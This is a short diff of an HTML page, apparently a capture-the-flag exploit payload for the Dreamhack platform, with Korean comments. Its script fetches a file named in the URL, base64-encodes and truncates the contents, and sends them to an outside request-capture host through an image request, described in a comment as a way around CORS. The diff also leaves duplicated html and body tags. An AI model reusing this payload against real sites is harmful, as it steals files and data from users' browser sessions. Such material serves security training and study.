@@ -1,14 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
+<!DOCTYPE html>
+<html>
+<body>
 <script>
 fetch(new URLSearchParams(location.search).get("file"))
   .then(r => r.text())
   .then(data => {
+    // base64 인코딩
+    const b64 = btoa(data);
+
+    // 길이가 너무 길면 짤릴 수 있으므로, 앞부분만 잘라서 테스트할 수도 있음
+    const leak = b64.slice(0, 500); // 필요한 만큼 조절
+
+    // 이미지 요청으로 exfiltrate (GET 방식, CORS 우회)
     const img = new Image();
-    img.src = "https://uheyzgr.request.dreamhack.games?leak=" + encodeURIComponent(btoa(data));
+    img.src = "https://uheyzgr.request.dreamhack.games?leak=" + encodeURIComponent(leak);
   });
 </script>
+</body>
+</html>
+
 
 </body>
 </html>
